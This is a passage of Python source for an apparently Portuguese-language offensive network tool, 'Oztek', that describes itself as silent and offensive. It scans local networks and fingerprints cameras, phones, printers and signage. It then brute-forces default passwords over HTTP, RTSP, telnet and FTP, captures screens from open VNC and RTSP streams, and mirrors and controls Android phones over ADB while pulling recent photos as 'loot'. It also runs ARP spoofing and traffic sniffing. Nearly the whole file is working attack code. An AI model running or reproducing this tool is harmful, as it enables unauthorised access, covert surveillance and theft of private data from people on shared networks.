        if os.path.isfile(f) and os.access(f, os.X_OK): return f
    return None

def have(b): return which(b) is not None
def root(): return sh("id -u").strip() == "0"

def jitter(par):
    time.sleep(random.uniform(0.3, 1.1) if par else random.uniform(0.02, 0.12))

def gateway():
    try:
        for ln in open("/proc/net/route").read().splitlines()[1:]:
            f = ln.split()
            if len(f) > 3 and f[1] == "00000000":
                return socket.inet_ntoa(struct.pack("<L", int(f[2], 16)))
    except Exception: pass
    for p in ("dhcp.wlan0.gateway", "dhcp.eth0.gateway", "dhcp.wlan1.gateway"):
        v = sh(f"getprop {p}").strip()
        if re.match(r"^\d+\.\d+\.\d+\.\d+$", v) and v != "0.0.0.0": return v
    return None

def my_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("1.1.1.1", 53)); ip = s.getsockname()[0]; s.close(); return ip
    except Exception:
        try: return socket.gethostbyname(socket.gethostname())
        except Exception: return None

def detect_net():
    ip = my_ip()
    if not ip or ip.startswith("127."): return None, None
    for ln in (sh("ip -4 -o addr show") or "").splitlines():
        m = re.search(rf"inet ({re.escape(ip)})/(\d+)", ln)
        if m: return ipaddress.ip_network(f"{ip}/{m.group(2)}", strict=False), ip
    for ln in (sh("ifconfig") or "").splitlines():
        if ip in ln:
            m = re.search(r"netmask (\d+\.\d+\.\d+\.\d+)", ln)
            if m:
                pre = ipaddress.IPv4Network("0.0.0.0/" + m.group(1)).prefixlen
                return ipaddress.ip_network(f"{ip}/{pre}", strict=False), ip
    return ipaddress.ip_network(f"{ip}/24", strict=False), ip

def arp_table():
    d = {}
    try:
        for ln in open("/proc/net/arp").read().splitlines()[1:]:
            f = ln.split()
            if len(f) >= 6 and f[3] != "00:00:00:00:00:00": d[f[0]] = f[3].upper()
    except Exception: pass
    return d

def arp_seed(net, jobs=160):
    q = queue.Queue()
    for h in net.hosts(): q.put(str(h))
    def w():
        while True:
            try: ip = q.get_nowait()
            except queue.Empty: return
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b"", (ip, 9)); s.close()
            except Exception: pass
    ts = [threading.Thread(target=w, daemon=True) for _ in range(jobs)]
    [t.start() for t in ts]; [t.join() for t in ts]

def tcp_probe(ip, port, timeout=1.1):
    try:
        s = socket.create_connection((ip, port), timeout); s.close(); return True
    except Exception: return False

def mdns(timeout=4):
    svcs = ["_adb-tls-connect._tcp.local", "_adb-tls-pairing._tcp.local", "_adb._tcp.local",
            "_googlecast._tcp.local", "_airplay._tcp.local", "_raop._tcp.local", "_http._tcp.local",
            "_https._tcp.local", "_ssh._tcp.local", "_vnc._tcp.local", "_rfb._tcp.local",
            "_smb._tcp.local", "_rtsp._tcp.local", "_ipp._tcp.local", "_printer._tcp.local",
            "_workstation._tcp.local", "_device-info._tcp.local", "_companion-link._tcp.local"]
    def pkt(n):
        q = b""
        for part in n.split("."):
            if part: q += bytes([len(part)]) + part.encode()
        return (struct.pack(">HHHHHH", random.randint(0, 0xffff), 0, 1, 0, 0, 0) + q +
                b"\x00" + struct.pack(">HH", 12, 1))
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try: s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    except Exception: pass
    for sv in svcs:
        try: s.sendto(pkt(sv), ("224.0.0.251", 5353))
        except Exception: pass
    found = set(); s.settimeout(0.5); end = time.time() + timeout
    while time.time() < end:
        try: d, a = s.recvfrom(4096)
        except socket.timeout: continue
        except Exception: break
        txt = d.decode("latin-1", "ignore")
        for m in re.finditer(r"([\w\-\. ]{2,63}\.(?:local|_tcp\.local|_udp\.local))", txt):
            found.add((a[0], m.group(1).strip()))
        for m in re.finditer(r":(\d{2,5})", txt[:200]):
            found.add((a[0], "porta:" + m.group(1)))
    s.close(); return sorted(found)

def ssdp(timeout=4):
    msg = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\n"
           "MX: 2\r\nST: ssdp:all\r\n\r\n").encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(0.8); res = {}
    try:
        for _ in range(3): s.sendto(msg, ("239.255.255.250", 1900))
        end = time.time() + timeout
        while time.time() < end:
            try: d, a = s.recvfrom(4096)
            except socket.timeout: continue
            except Exception: break
            t = d.decode("latin-1", "ignore")
            st = re.search(r"(?im)^ST:\s*(.+)$", t); sv = re.search(r"(?im)^SERVER:\s*(.+)$", t)
            lo = re.search(r"(?im)^LOCATION:\s*(.+)$", t)
            res[a[0]] = {"st": (st.group(1).strip()[:120] if st else ""),
                         "server": (sv.group(1).strip()[:120] if sv else ""),
                         "loc": (lo.group(1).strip()[:200] if lo else "")}
    finally: s.close()
    return res

def nbns(ip, timeout=1.5):
    tid = random.randint(1, 65535)
    nm = b"\x20" + b"CK" + b"A" * 30 + b"\x00"
    pkt = struct.pack(">HHHHHH", tid, 0x0000, 1, 0, 0, 0) + nm + struct.pack(">HH", 0x0021, 0x0001)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeout)
    try:
        s.sendto(pkt, (ip, 137)); d, _ = s.recvfrom(2048)
    except Exception: return ""
    finally: s.close()
    try:
        i = d.find(b"\xc0") + 2
        names = []
        while i + 18 <= len(d):
            raw = d[i:i+15].decode("latin-1", "ignore").strip()
            flags = struct.unpack(">H", d[i+16:i+18])[0]
            if raw and not (flags & 0x8000): names.append(raw)
            i += 18
        return names[0] if names else ""
    except Exception: return ""

def recv_exact(s, n):
    b = b""
    while len(b) < n:
        x = s.recv(n - len(b))
        if not x: raise OSError("fim")
        b += x
    return b

def http_get(ip, port, path="/", tls=False, timeout=T):
    o = {"port": port, "status": 0, "server": "", "powered": "", "auth": "", "title": "",
         "body": "", "cert": ""}
    s = None
    try:
        s = socket.create_connection((ip, port), timeout)
        if tls:
            s = ssl._create_unverified_context().wrap_socket(s, server_hostname=ip)
            der = s.getpeercert(binary_form=True)
            if der: o["cert"] = hashlib.sha256(der).hexdigest()[:16]
        s.sendall(f"GET {path} HTTP/1.1\r\nHost: {ip}:{port}\r\nUser-Agent: {UA}\r\n"
                  f"Accept: */*\r\nConnection: close\r\n\r\n".encode())
        d = b""; s.settimeout(timeout)
        while len(d) < 40000:
            x = s.recv(8192)
            if not x: break
            d += x
        txt = d.decode("latin-1", "ignore")
        m = re.match(r"HTTP/\d\.\d (\d+)", txt)
        if m: o["status"] = int(m.group(1))
        for k, f in (("server", "Server"), ("powered", "X-Powered-By"), ("auth", "WWW-Authenticate")):
            mm = re.search(rf"(?im)^{f}:\s*(.+)$", txt)
            if mm: o[k] = mm.group(1).strip()[:140]
        t = re.search(r"(?is)<title[^>]*>(.*?)</title>", txt)
        if t: o["title"] = re.sub(r"\s+", " ", t.group(1)).strip()[:140]
        o["body"] = txt[:3000]
    except Exception: pass
    finally:
        if s:
            try: s.close()
            except Exception: pass
    return o

def banner(ip, port, timeout=T):
    try:
        s = socket.create_connection((ip, port), timeout); s.settimeout(timeout)
        s.sendall(b"\r\n"); d = s.recv(512); s.close()
        return d.decode("latin-1", "ignore").strip()[:220]
    except Exception: return ""

def rtsp(ip, port=554, timeout=T):
    try:
        s = socket.create_connection((ip, port), timeout); s.settimeout(timeout)
        s.sendall(f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: {UA}\r\n\r\n".encode())
        d = s.recv(2048).decode("latin-1", "ignore"); s.close()
        return d[:500]
    except Exception: return ""

def snmp(ip, comm="public", oid="1.3.6.1.2.1.1.1.0", timeout=1.8):
    def blen(n):
        if n < 128: return bytes([n])
        b = n.to_bytes((n.bit_length() + 7) // 8, "big"); return bytes([0x80 | len(b)]) + b
    def tlv(t, v): return bytes([t]) + blen(len(v)) + v
    def uint(n):
        if n == 0: return b"\x00"
        b = n.to_bytes((n.bit_length() + 7) // 8, "big")
        return (b"\x00" + b) if b[0] & 0x80 else b
    p = [int(x) for x in oid.split(".")]
    body = bytes([p[0] * 40 + p[1]]) + b"".join(tlv(2, uint(x)) for x in p[2:])
    vb = tlv(0x30, tlv(6, body) + b"\x05\x00")
    pdu = tlv(0xA0, tlv(2, uint(random.randint(1, 2**30))) + tlv(2, b"\x00") +
              tlv(2, b"\x00") + tlv(0x30, vb))
    pkt = tlv(0x30, tlv(2, b"\x00") + tlv(4, comm.encode()) + pdu)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeout)
    try:
        s.sendto(pkt, (ip, 161)); d, _ = s.recvfrom(4096)
    except Exception: return ""
    finally: s.close()
    i = d.find(b"\x04", 38)
    if i < 0 or i + 1 >= len(d): return ""
    ln = d[i+1]
    return d[i+2:i+2+ln].decode("latin-1", "ignore").strip()

def pjl(ip, timeout=T):
    try:
        s = socket.create_connection((ip, 9100), timeout); s.settimeout(timeout)
        s.sendall(b"\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X\r\n")
        d = s.recv(1024).decode("latin-1", "ignore"); s.close()
        m = re.search(r'"([^"]+)"', d)
        return (m.group(1) if m else d.strip())[:120]
    except Exception: return ""

def upnp(loc):
    try:
        m = re.match(r"http://([\d\.]+):(\d+)(/.*)", loc)
        if not m: return {}
        r = http_get(m.group(1), int(m.group(2)), m.group(3))
        out = {}
        for tag in ("friendlyName", "manufacturer", "modelName", "modelNumber", "deviceType"):
            mm = re.search(rf"<{tag}>(.*?)</{tag}>", r["body"], re.S)
            if mm: out[tag] = mm.group(1).strip()[:80]
        return out
    except Exception: return {}

def eureka(ip, timeout=T):
    r = http_get(ip, 8008, "/setup/eureka_info", timeout=timeout)
    if r["status"] != 200: return {}
    try:
        j = json.loads(r["body"])
        return {"nome": j.get("name", ""), "modelo": j.get("detail", {}).get("model_name", ""),
                "versao": j.get("detail", {}).get("version", "")}
    except Exception: return {}

def isapi(ip, port, tls=False):
    for p in ("/ISAPI/System/deviceInfo", "/cgi-bin/magicBox.cgi?action=getDeviceType"):
        r = http_get(ip, port, p, tls=tls)
        if r["status"] == 200 and r["body"]:
            m = re.search(r"<(deviceName|deviceType|type)>(.*?)</\1>", r["body"])
            return (m.group(2) if m else "respondeu 200")[:80]
        if r["status"] == 401 and r["auth"]: return "auth:" + r["auth"][:60]
    return ""

PORTS = [21, 22, 23, 53, 80, 81, 443, 445, 554, 631, 1883, 3000, 3389, 5000, 5555, 5900, 5901,
         7000, 7100, 7547, 8000, 8008, 8080, 8081, 8082, 8088, 8443, 8554, 8888, 8899, 9000,
         9100, 10000, 34567, 37777, 49152, 62078]

SIG = {
 "painel-led": ["novastar", "nova star", "novalct", "smartlct", "colorlight", "ledvision",
                "huidu", "hdplayer", "brightsign", "brightauthor", "magicinfo", "led display",
                "signage", "display controller"],
 "celular": ["android", "adb", "eureka", "airplay", "raop", "iphone", "ipad", "companion-link"],
 "camera": ["dahua", "dhip", "hikvision", "websdk", "xmeye", "sofia", "rtsp"],
 "roteador": ["router", "tp-link", "d-link", "intelbras", "mikrotik", "ubiquiti", "cisco",
              "tr-069", "openwrt"],
 "impressora": ["printer", "ipp", "pjl", "jetdirect", "laserjet", "epson"],
 "cast": ["chromecast", "google cast", "eureka", "dial"],
 "nas": ["samba", "smb", "synology", "qnap", "nas", "webdav"],
 "iot": ["tplink", "tuya", "shelly", "sonoff", "esp32", "espressif"],
}

def classify(h):
    blob = " ".join([h.get("server", ""), h.get("title", ""), h.get("raw", ""), h.get("nbns", ""),
                     h.get("mdns", ""), h.get("upnp", ""), h.get("snmp", ""), h.get("rtsp", ""),
                     h.get("pjl", ""), h.get("eureka", ""), h.get("isapi", "")]).lower()
    tags = [k for k, v in SIG.items() if any(s in blob for s in v)]
    sc = 0
    if "painel-led" in tags: sc += 70
    if "signage" in blob or "led display" in blob: sc += 20
    if 554 in h["ports"] and h["rtsp"]: sc += 15
    if 5555 in h["ports"] or "_adb" in h.get("mdns", ""): sc += 25
    if "celular" in tags: sc += 20
    if "cast" in tags: sc += 15
    if "camera" in tags: sc += 10
    if 9100 in h["ports"] and h["pjl"]: sc += 20
    if h["snmp"]: sc += 15
    if 5900 in h["ports"]: sc += 10
    return tags, min(sc, 100)

def probe(ip, par=False, deep=True, loud=False):
    h = {"ip": ip, "ports": {}, "tags": [], "score": 0, "server": "", "title": "", "raw": "",
         "nbns": "", "mdns": "", "upnp": "", "snmp": "", "rtsp": "", "pjl": "", "eureka": "",
         "isapi": "", "creds": None}
    for p in (range(1, 1025) if loud else PORTS):
        if tcp_probe(ip, p): h["ports"][p] = "open"
        if par and p % 8 == 0: jitter(True)
    if not h["ports"]: return None
    h["nbns"] = nbns(ip)
    h["snmp"] = snmp(ip)
    if 9100 in h["ports"]: h["pjl"] = pjl(ip)
    if 8008 in h["ports"]: h["eureka"] = json.dumps(eureka(ip), ensure_ascii=False)
    if deep:
        for p in (80, 8080, 8081, 8000, 3000, 5000, 81, 8888, 8082, 8088):
            if p in h["ports"]:
                r = http_get(ip, p)
                h["raw"] += r["body"]; h["server"] += " " + r["server"]; h["title"] += " " + r["title"]
                if r["auth"]: h["raw"] += " auth:" + r["auth"]
        for p in (443, 8443):
            if p in h["ports"]:
                r = http_get(ip, p, tls=True)
                h["server"] += " " + r["server"]; h["raw"] += r["body"]
        for p in (554, 8554):
            if p in h["ports"]: h["rtsp"] = rtsp(ip, p)
        for p in (22, 23, 21):
            if p in h["ports"]: h["raw"] += " " + banner(ip, p)
        if any(p in h["ports"] for p in (80, 443, 8080, 8443)):
            h["isapi"] = isapi(ip, 80 if 80 in h["ports"] else 443, 443 in h["ports"])
    h["tags"], h["score"] = classify(h)
    return h

CREDS = {
 "painel-led": [("admin", "admin"), ("admin", "123456"), ("admin", "888888"),
                ("admin", "12345678"), ("admin", "admin123"), ("Admin", "admin"),
                ("root", "root"), ("admin", "")],
 "celular": [("admin", "admin"), ("root", "root")],
 "camera": [("admin", "admin"), ("admin", "12345"), ("admin", "888888"),
            ("admin", "Admin12345"), ("admin", "")],
 "roteador": [("admin", "admin"), ("admin", "password"), ("admin", "1234"), ("root", "root"),
              ("admin", "admin123"), ("admin", ""), ("support", "support")],
 "impressora": [("admin", "admin"), ("admin", "1234"), ("admin", "")],
 "generico": [("admin", "admin"), ("admin", "1234"), ("admin", "12345"), ("admin", "123456"),
              ("admin", "password"), ("admin", "888888"), ("admin", "admin123"), ("root", "root"),
              ("root", "toor"), ("admin", ""), ("user", "user")],
}

def cands(tags):
    out, seen = [], set()
    for t in tags + ["generico"]:
        for u, p in CREDS.get(t, []):
            if (u, p) not in seen:
                seen.add((u, p)); out.append((u, p))
    return out

def http_basic(ip, port, u, p, tls=False):
    s = None
    try:
        s = socket.create_connection((ip, port), T)
        if tls: s = ssl._create_unverified_context().wrap_socket(s, server_hostname=ip)
        tok = base64.b64encode(f"{u}:{p}".encode()).decode()
        s.sendall(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {UA}\r\nAuthorization: Basic {tok}\r\n"
                  f"Connection: close\r\n\r\n".encode())
        r = s.recv(600).decode("latin-1", "ignore")
        return not re.match(r"HTTP/\d\.\d 401", r)
    except Exception: return False
    finally:
        if s:
            try: s.close()
            except Exception: pass

def rtsp_auth(ip, port, u, p):
    s = None
    try:
        s = socket.create_connection((ip, port), T); s.settimeout(T)
        tok = base64.b64encode(f"{u}:{p}".encode()).decode()
        s.sendall(f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {tok}\r\n\r\n".encode())
        r = s.recv(600).decode("latin-1", "ignore")
        return r.startswith("RTSP/1.0 200")
    except Exception: return False
    finally:
        if s:
            try: s.close()
            except Exception: pass

def telnet_login(ip, u, p, to=4.0):
    try:
        s = socket.create_connection((ip, 23), to); s.settimeout(to)
        b = b""; t0 = time.time()
        while time.time() - t0 < to:
            try: b += s.recv(512)
            except socket.timeout: break
            if re.search(rb"(?i)(login|user(name)?)[:\s]", b): break
        s.sendall((u + "\n").encode()); time.sleep(0.35)
        s.sendall((p + "\n").encode()); time.sleep(0.6)
        try: r = s.recv(2048).decode("latin-1", "ignore")
        except Exception: r = ""
        s.close()
        return bool(r) and not re.search(r"(?i)(incorrect|failed|denied|inv[aá]lido|refused)", r)
    except Exception: return False

def ftp_login(ip, u, p):
    try:
        f = ftplib.FTP(); f.connect(ip, 21, 5); f.login(u, p); f.quit(); return True
    except Exception: return False

def vnc_none(ip, port=5900):
    s = None
    try:
        s = socket.create_connection((ip, port), 4); s.settimeout(4)
        if b"RFB" not in recv_exact(s, 12): return False
        s.sendall(b"RFB 003.008\n")
        n = recv_exact(s, 1)[0]; return 1 in recv_exact(s, n)
    except Exception: return False
    finally:
        if s:
            try: s.close()
            except Exception: pass

def brute(h, par=False):
    ip = h["ip"]; cl = cands(h["tags"])[:14]
    for port in [p for p in h["ports"] if p in (80, 8080, 8081, 8000, 3000, 5000, 81, 8888, 443, 8443)]:
        tls = port in (443, 8443)
        for u, p in cl:
            if http_basic(ip, port, u, p, tls): return {"svc": "http", "port": port, "user": u, "pwd": p}
            if par: jitter(True)
    for port in [p for p in h["ports"] if p in (554, 8554)]:
        for u, p in cl[:8]:
            if rtsp_auth(ip, port, u, p): return {"svc": "rtsp", "port": port, "user": u, "pwd": p}
    if 23 in h["ports"]:
        for u, p in cl[:6]:
            if telnet_login(ip, u, p): return {"svc": "telnet", "port": 23, "user": u, "pwd": p}
    if 21 in h["ports"]:
        for u, p in cl[:5]:
            if ftp_login(ip, u, p): return {"svc": "ftp", "port": 21, "user": u, "pwd": p}
    return None

def png(path, w, hh, rgb):
    def ck(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xffffffff)
    raw = b"".join(b"\x00" + rgb[y * w * 3:(y + 1) * w * 3] for y in range(hh))
    open(path, "wb").write(b"\x89PNG\r\n\x1a\n" + ck(b"IHDR", struct.pack(">IIBBBBB", w, hh, 8, 2, 0, 0, 0))
                           + ck(b"IDAT", zlib.compress(raw, 6)) + ck(b"IEND", b""))

def vnc_capture(ip, port=5900, to=8.0):
    s = None
    try:
        s = socket.create_connection((ip, port), to); s.settimeout(to)
        if b"RFB" not in recv_exact(s, 12): return None
        s.sendall(b"RFB 003.008\n")
        n = recv_exact(s, 1)[0]
        if 1 not in recv_exact(s, n): return None
        s.sendall(bytes([1]))
        if recv_exact(s, 4) != b"\x00\x00\x00\x00": return None
        s.sendall(b"\x01")
        w, hh = struct.unpack(">HH", recv_exact(s, 4))
        if not (8 < w < 4000 and 8 < hh < 4000): return None
        s.sendall(b"\x00\x00\x00\x00" + bytes([32, 24, 0, 1]) + struct.pack(">HHH", 255, 255, 255)
                  + bytes([16, 8, 0]) + b"\x00\x00\x00")
        s.sendall(b"\x02\x00\x00\x01\x00\x00\x00\x00")
        s.sendall(b"\x03\x00\x00\x00\x00\x00" + struct.pack(">HH", w, hh))
        rgb = bytearray(w * hh * 3); end = time.time() + to
        while time.time() < end:
            t = recv_exact(s, 1)[0]
            if t == 0:
                recv_exact(s, 1); nr = struct.unpack(">H", recv_exact(s, 2))[0]
                for _ in range(nr):
                    x, y, rw, rh = struct.unpack(">HHHH", recv_exact(s, 8))
                    if struct.unpack(">i", recv_exact(s, 4))[0] != 0: continue
                    px = recv_exact(s, rw * rh * 4)
                    for row in range(rh):
                        src = row * rw * 4; dst = ((y + row) * w + x) * 3
                        for col in range(rw):
                            rgb[dst + col * 3:dst + col * 3 + 3] = bytes(
                                (px[src + col * 4 + 2], px[src + col * 4 + 1], px[src + col * 4]))
                p = os.path.join(loot(), f"vnc_{ip}_{stamp()}.png"); png(p, w, hh, bytes(rgb)); return p
            elif t == 1: recv_exact(s, 3)
            elif t == 2: recv_exact(s, 1)
            elif t == 3:
                recv_exact(s, 3); nr = struct.unpack(">H", recv_exact(s, 2))[0]
                for _ in range(nr): recv_exact(s, 12)
            else: break
    except Exception: return None
    finally:
        if s:
            try: s.close()
            except Exception: pass
    return None

def rtsp_shot(ip, port=554, u=None, p=None):
    if not have("ffmpeg"): return None
    for path in ("/", "/stream1", "/live", "/h264", "/11", "/cam/realmonitor?channel=1&subtype=0",
                 "/Streaming/Channels/101", "/video1", "/0"):
        url = f"rtsp://{u}:{p}@{ip}:{port}{path}" if u else f"rtsp://{ip}:{port}{path}"
        out = os.path.join(loot(), f"rtsp_{ip}_{stamp()}.jpg")
        sh(f'ffmpeg -nostdin -y -rtsp_transport tcp -i "{url}" -frames:v 1 -q:v 3 "{out}" -loglevel quiet', 22)
        if os.path.exists(out):
            if os.path.getsize(out) > 4000: return out
            os.remove(out)
    return None

def adb(*a, t=25): return sh(["adb"] + list(a), t) if have("adb") else ""
def adb_conn(ip, port=5555):
    adb("disconnect"); return "connected" in adb("connect", f"{ip}:{port}", t=12).lower()
def adb_ok(ip, port=5555): return f"{ip}:{port}" in adb("devices")

def adb_shot(ip, port=5555):
    if not adb_ok(ip, port): return None
    d = adb("-s", f"{ip}:{port}", "exec-out", "screencap", "-p", t=30)
    if not d or len(d) < 2000: return None
    p = os.path.join(loot(), f"tela_{ip}_{stamp()}.png")
    open(p, "wb").write(d.encode("latin-1", "ignore")); return p

def adb_info(ip, port=5555):
    d = f"{ip}:{port}"
    return {k: adb("-s", d, "shell", "getprop", v).strip() for k, v in
            (("modelo", "ro.product.model"), ("marca", "ro.product.brand"),
             ("android", "ro.build.version.release"), ("serial", "ro.serialno"),
             ("sdk", "ro.build.version.sdk"))}

def draw(p):
    if not p or not os.path.exists(p): return False
    if have("chafa"): sh(f'chafa -f symbols --size 60x38 "{p}"', 18); return True
    return False

def mirror(ip, port=5555, fps=0.8, secs=600):
    if not adb_ok(ip, port): log("ADB não autorizado.", "y"); return
    tmp = os.path.join(loot(), "_m.png"); end = time.time() + secs
    log(f"espelhando {ip} — Ctrl+C", "g")
    try:
        while time.time() < end:
            d = adb("-s", f"{ip}:{port}", "exec-out", "screencap", "-p", t=20)
            if d and len(d) > 2000:
                open(tmp, "wb").write(d.encode("latin-1", "ignore"))
                sys.stdout.write("\033[H\033[2J")
                print(c(f" {ip} {datetime.now().strftime('%H:%M:%S')}", "b")); draw(tmp)
            time.sleep(max(0.05, 1 / fps - 0.4))
    except KeyboardInterrupt: print()

def adb_ctl(ip, port, act, args):
    d = f"{ip}:{port}"
    if act == "tap": adb("-s", d, "shell", "input", "tap", *map(str, args))
    elif act == "swipe": adb("-s", d, "shell", "input", "swipe", *map(str, args))
    elif act == "text": adb("-s", d, "shell", "input", "text", str(args[0]).replace(" ", "%s"))
    elif act == "key": adb("-s", d, "shell", "input", "keyevent", str(args[0]))

def adb_loot(ip, port=5555, lim=30):
    d = f"{ip}:{port}"
    if not adb_ok(ip, port): return {}
    pk = adb("-s", d, "shell", "pm", "list", "packages", "-3")
    fl = adb("-s", d, "shell", "find", "/sdcard/DCIM", "-type", "f", "-newermt", "-7d", "-size", "+40k")
    dd = os.path.join(loot(), f"adb_{ip}_{stamp()}"); os.makedirs(dd, exist_ok=True); n = 0
    for f in fl.splitlines()[:lim]:
        if f.strip() and adb("-s", d, "pull", f.strip(), dd, t=40): n += 1
    return {"pacotes": [x.replace("package:", "").strip() for x in pk.splitlines() if x.strip()],
            "fotos": n, "dir": dd}

def arp_spoof(gw, target, secs=60):
    if not root(): log("ARP spoof exige root (tsu).", "r"); return
    if not have("arpspoof"): log("pkg install dsniff", "r"); return
    log(f"envenenando {target} <-> {gw} por {secs}s", "m")
    p1 = subprocess.Popen(["arpspoof", "-i", "wlan0", "-t", target, gw])
    p2 = subprocess.Popen(["arpspoof", "-i", "wlan0", "-t", gw, target])
    try: time.sleep(secs)
    except KeyboardInterrupt: pass
    finally:
        p1.terminate(); p2.terminate(); log("ARP restaurado.", "g")

def sniff(secs=30):
    if not have("tcpdump"): log("instale tcpdump.", "r"); return None
    p = os.path.join(loot(), f"sniff_{stamp()}.pcap")
    log(f"capturando {secs}s (DNS, SNI, DHCP)...", "m")
    sh(f"tcpdump -i any -w '{p}' -G {secs} -W 1 'udp port 53 or udp port 67 or tcp port 443'", secs + 8)
    txt = sh(f"tcpdump -nn -r '{p}' 2>/dev/null | head -400")
    dns = sorted(set(re.findall(r"A\? ([\w\.\-]+\.[a-z]{2,})", txt)))
    ips = sorted(set(re.findall(r"^[\d\.:]+ > ([\d\.]+)\.", txt, re.M)))
    rep = os.path.join(loot(), f"sniff_{stamp()}.txt")
    open(rep, "w").write("DNS:\n" + "\n".join(dns) + "\n\nPEERS:\n" + "\n".join(ips))
    log(f"{len(dns)} domínio(s) — {rep}", "g")
    return rep

def pjl_print(ip, texto):
    try:
        s = socket.create_connection((ip, 9100), 6)
        s.sendall(b"\x1b%-12345X@PJL\r\n@PJL ENTER LANGUAGE=PCL\r\n")
        s.sendall(b"\x1bE\x1b(s0p10h12v0s0b4099T" + texto.encode("latin-1", "ignore") + b"\r\n\x0c\x1bE")
        s.sendall(b"\x1b%-12345X\r\n"); s.close(); return True
    except Exception: return False

def report(hosts, meta):
    p = os.path.join(loot(), f"rel_{stamp()}.json")
    json.dump({"versao": VERSION, "quando": datetime.now().isoformat(), "meta": meta, "hosts": hosts},
              open(p, "w"), indent=2, ensure_ascii=False)
    m = p.replace(".json", ".md")
    with open(m, "w") as f:
        f.write(f"# Oztek {meta.get('net')} — {datetime.now()}\n\n")
        for h in hosts:
            f.write(f"## {h['ip']}  score {h['score']}  [{','.join(h['tags'])}]\n")
            f.write(f"portas: {sorted(h['ports'])}\n")
            for k in ("nbns", "snmp", "pjl", "eureka", "isapi", "title", "creds"):
                if h.get(k): f.write(f"{k}: {h[k]}\n")
            if h.get("shot"): f.write(f"evidencia: {h['shot']}\n")
            f.write("\n")
    return p, m

def table(hosts):
    print()
    print(c(f"{'IP':<16}{'SCORE':<7}{'PERFIL':<14}PORTAS", "b")); print("-" * 92)
    for h in hosts:
        k = "g" if h["score"] >= 50 else ("y" if h["score"] >= 20 else "d")
        print(f"{h['ip']:<16}{c(str(h['score']), k):<16}"
              f"{(','.join(h['tags']) or '-')[:13]:<14}"
              f"{','.join(map(str, sorted(h['ports'])))[:44]}")
        if h["nbns"]: print(c(f"   nome: {h['nbns']}", "d"))
        if h["snmp"]: print(c(f"   snmp: {h['snmp'][:60]}", "d"))
        if h["pjl"]: print(c(f"   impressora: {h['pjl'][:60]}", "d"))
        if h["creds"]: print(c(f"   ACESSO {h['creds']['svc']} {h['creds']['user']}:{h['creds']['pwd']}", "g"))
        if h.get("shot"): print(c(f"   imagem: {h['shot']}", "g"))
    print()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--net"); ap.add_argument("--loud", action="store_true")
    ap.add_argument("--fast", action="store_true"); ap.add_argument("--paranoid", action="store_true")
    ap.add_argument("--write", action="store_true")
    ap.add_argument("--mirror"); ap.add_argument("--port", type=int, default=5555)
    ap.add_argument("--snap"); ap.add_argument("--loot"); ap.add_argument("--tap")
    ap.add_argument("--spoof"); ap.add_argument("--sniff", type=int)
    ap.add_argument("--print", dest="prt"); ap.add_argument("--boot", action="store_true")
    a = ap.parse_args()

    print(c(f"  OZTEK v{VERSION} — ofensivo silencioso · real\n", "b"))

    if a.boot:
        need = [b for b in ("nmap", "adb", "ffmpeg", "chafa", "tcpdump", "arpspoof") if not have(b)]
        if not need: log("tudo pronto.", "g"); return
        log("faltam: " + ", ".join(need), "y")
        if input("instalar? [s/N] ").lower() == "s":
            for b in need: sh(f"pkg install -y {'android-tools' if b == 'adb' else b}", 300)
        return
    if a.mirror:
        adb_conn(a.mirror, a.port); mirror(a.mirror, a.port); return
    if a.snap:
        adb_conn(a.snap, a.port); draw(adb_shot(a.snap, a.port)); return
    if a.loot:
        adb_conn(a.loot, a.port); print(json.dumps(adb_loot(a.loot, a.port), indent=2, ensure_ascii=False)); return
    if a.tap:
        ip, _, xy = a.tap.partition(" "); adb_conn(ip, a.port); adb_ctl(ip, a.port, "tap", xy.split()); return
    if a.spoof:
        t = a.net or input("IP alvo: ").strip(); arp_spoof(gateway() or "", t); return
    if a.sniff: sniff(a.sniff); return
    if a.prt:
        ip, _, tx = a.prt.partition(" "); log("impresso." if pjl_print(ip, tx) else "falhou", "g"); return

    net, me = (ipaddress.ip_network(a.net, strict=False), None) if a.net else detect_net()
    if not net: log("rede não detectada; use --net", "r"); return
    gw = gateway()
    log(f"{net}  local {me or '?'}  gw {gw or '?'}", "b")
    if not gw: log("sem gateway (rede isolada?) — seguindo", "y")

    arp_seed(net)
    live = set(arp_table())
    md = mdns(); ss = ssdp()
    for ip, _ in md: live.add(ip)
    for ip in ss: live.add(ip)
    live = sorted({i for i in live if ipaddress.ip_address(i) in net},
                  key=lambda x: ipaddress.ip_address(x))
    log(f"{len(live)} host(s) descobertos por ARP/passivo.", "g")

    hosts, qq = [], queue.Queue()
    for i in live: qq.put(i)
    lock = threading.Lock(); done = [0]
    mdmap = {}
    for ip, n in md: mdmap.setdefault(ip, []).append(n)

    def w():
        while True:
            try: ip = qq.get_nowait()
            except queue.Empty: return
            h = probe(ip, a.paranoid, not a.fast, a.loud)
            with lock:
                done[0] += 1
                sys.stdout.write(f"\r  sondando {done[0]}/{len(live)}  {ip}          "); sys.stdout.flush()
                if h:
                    h["mdns"] = " ".join(mdmap.get(ip, []))
                    if ip in ss: h["raw"] += " " + ss[ip]["st"] + " " + ss[ip]["server"]
                    if ss.get(ip, {}).get("loc"):
                        u = upnp(ss[ip]["loc"]); h["upnp"] = json.dumps(u, ensure_ascii=False)
                        h["raw"] += " " + h["upnp"]
                    h["tags"], h["score"] = classify(h)
                    hosts.append(h)
            if a.paranoid: jitter(True)
